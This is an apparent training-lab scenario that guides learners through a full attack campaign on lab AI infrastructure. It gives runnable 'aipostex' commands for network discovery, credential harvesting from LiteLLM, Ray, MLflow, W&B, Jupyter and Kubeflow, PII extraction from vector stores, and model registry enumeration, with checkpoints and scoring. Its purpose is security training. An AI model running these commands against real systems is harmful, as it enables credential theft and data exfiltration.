# Scenario 12: Multi-Vector Campaign

**Difficulty:** Advanced
**Time:** ~60 minutes
**Prerequisites:** Complete Scenarios [01](scenario-01.md)–[11](scenario-11.md)
**Target:** All lab hosts — full kill chain

## Background

Real-world AI infrastructure attacks don't target a single service. An advanced attacker chains multiple vulnerabilities: initial reconnaissance leads to credential harvesting, which enables lateral movement, which provides access to modify models and data. This scenario ties together everything from the previous 11 scenarios into a coherent attack campaign.

## Objective

Execute a full kill chain across the lab environment: discover → enumerate → harvest credentials → move laterally → exfiltrate data → tamper with models.

## Campaign Phases

### Phase 1: Reconnaissance (Scenarios 01–03)

```bash
# Map the entire network
aipostex discover network --target 172.16.50.10,172.16.50.20,172.16.50.30,172.16.50.40

# Fingerprint high-value targets
aipostex discover network --discovery-only --target 172.16.50.20:4000   # LiteLLM
aipostex discover network --discovery-only --target 172.16.50.40:8180   # HF TGI gateway
aipostex discover network --discovery-only --target 172.16.50.20:8181   # HF TEI
aipostex discover network --discovery-only --target 172.16.50.20:9000   # Kubeflow
aipostex discover network --discovery-only --target 172.16.50.20:8501   # TF Serving
```

**Checkpoint:** You should have identified 29+ endpoints across 4 hosts, with service types and versions for the ML platform.

### Phase 2: Credential Harvest (Scenarios 02, 05, 06, 09)

```bash
# Hit every credential source
aipostex litellm --target 172.16.50.20:4000 config-extract
aipostex ray --target 172.16.50.20:8265 jobs
aipostex mlflow --target http://172.16.50.30:5000 --header "Authorization: Basic <ray-looted-basic>" runs --limit 20
aipostex wandb --target 172.16.50.20:8444 secrets --entity acme-ml-team --project fraud-detection
aipostex jupyter --target 172.16.50.10:8888 enum
aipostex jupyter --target 172.16.50.30:8889 enum
aipostex kubeflow --target 172.16.50.20:9000 enum
```

**Checkpoint:** You should have harvested 15+ distinct credentials: API keys (OpenAI, Anthropic, HF), cloud credentials (AWS), database strings (Snowflake), and service tokens (W&B).

### Phase 3: Data Exfiltration (Scenario 04)

```bash
# Extract all vector database contents
aipostex vectordb --type chromadb --target 172.16.50.20:8000 search-sensitive
aipostex vectordb --type qdrant --target 172.16.50.30:6333 search-sensitive
aipostex vectordb --type weaviate --target 172.16.50.30:8080 search-sensitive
```

**Checkpoint:** PII and sensitive documents extracted from all three vector stores.

### Phase 4: Lateral Movement (Scenario 08)

```bash
# Vulnerability-scan the estate (credential chains surface from exploit findings + `report view --chains`)
aipostex scan targets 172.16.50.10 172.16.50.20 172.16.50.30 172.16.50.40
```

**Checkpoint:** At least 3 credential chains identified, connecting 4+ services.

### Phase 5: Model & Pipeline Compromise (Scenarios 09, 10)

```bash
# Enumerate TF Serving models
aipostex tfserving --target 172.16.50.20:8501 models

# Enumerate model registries + inventory model artifacts (via the looted-cred gateway)
aipostex mlflow --target http://172.16.50.30:5000 --header "Authorization: Basic <ray-looted-basic>" registry
aipostex mlflow --target http://172.16.50.30:5000 --header "Authorization: Basic <ray-looted-basic>" model-artifacts --model acme-churn-ensemble
```

**Checkpoint:** Model inventories extracted from TF Serving (2 models), MLflow registry, and Kubeflow pipelines.

### Phase 6: Full Report

```bash
# Generate the comprehensive assessment report
aipostex report render campaign-report.json --format html --output campaign-report.html
```

## Expected Finding

A complete assessment report containing:

| Category | Expected Count |
|----------|---------------|
| Endpoints discovered | 29+ |
| Services fingerprinted | 14+ |
| Credentials harvested | 15+ |
| Credential chains | 3+ |
| PII records | Multiple |
| Writable vector stores | 2+ |
| Models enumerated | 5+ |
| Total findings | 170+ |

**Scoring objective:** Generate a report with findings from all 4 hosts, containing at least 100 total findings across all categories.

## Real-World Impact

This scenario demonstrates the full blast radius of unsecured AI infrastructure. Starting from network access alone, an attacker can:
1. Map every AI service in the organization
2. Harvest credentials for cloud providers, SaaS tools, and databases
3. Extract sensitive data from vector stores powering RAG systems
4. Chain credentials to access services that weren't directly exposed
5. Tamper with models in registries, poisoning downstream predictions
6. Inject pipeline runs to maintain persistent access

The lesson: AI security is not about securing individual services — it's about securing the entire ecosystem and the credential flows between them.

## Scoring

Run the whole campaign inside one engagement (`aipostex sessions start campaign`), then score what it
captured:

```bash
# On the attack box
aipostex engagement merge ~/engagements/campaign/findings.jsonl -o ~/engagement.json
python3 ~/lab/scoring/score.py ~/engagement.json --strict
```

Compare your score against the [scoring rubric](../scoring/scoring.md) which expects 170 total seeded findings across all categories.
